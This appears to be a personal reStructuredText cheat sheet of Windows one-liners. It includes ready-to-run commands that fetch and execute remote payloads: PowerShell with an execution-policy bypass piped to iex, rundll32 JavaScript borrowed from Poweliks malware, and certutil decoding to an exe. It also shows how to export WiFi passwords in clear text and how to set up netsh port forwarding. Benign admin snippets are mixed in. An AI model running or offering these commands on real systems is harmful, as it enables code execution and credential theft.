Oneliners commands
==================

Here are some useful short commands for Windows systems that may be useful.

Download and run
----------------

Download and run a script

* PowerShell::

    powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex"

* JavaScript through Rundll32 (used by Win32/Poweliks malware)::

    rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();

* Using ``certutil``::

    certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe

Source: https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/amp/

Downloading files with PowerShell::

    $content = (New-Object Net.WebClient).DownloadString("http://webserver/file.txt")

    # Save to a file
    Invoke-WebRequest -Uri http://webserver/file.txt -OutFile file.txt -UseBasicParsing

    # With BITS (Background Intelligent Transfer Service)
    ipmo BitsTransfer;Start-BitsTransfer -Source "http://webserver/file.txt" -Destination C:\Windows\Temp\


Proxy settings
--------------

Get the HTTP proxy which is currently configured::

    reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer


WiFi profiles
-------------

List available WiFi profiles::

    netsh wlan show profiles

Export WiFi profiles (username and password) to ``%APPDATA%\<profile>.xml``::

    cmd.exe /c netsh wlan export profile key=clear folder="%APPDATA%"

Source: https://securelist.com/shedding-skin-turlas-fresh-faces/88069/


Enumerate all processes
-----------------------

::

    query process *


TCP port forwarding with netsh
------------------------------

::

    netsh interface portproxy add v4tov4 listenport=1234 listenaddress=192.0.2.42 connectport=80 connectaddress=10.13.37.1


CSV Viewer
----------

Display a simple CSV file in a simple GUI, from a PowerShell prompt::

    Import-Csv -Path file.csv | Out-GridView

In order to produce a CSV from a PowerShell command::

    ... | Sort-Object -Property Timestamp | export4-csv file.csv -notypeinformation
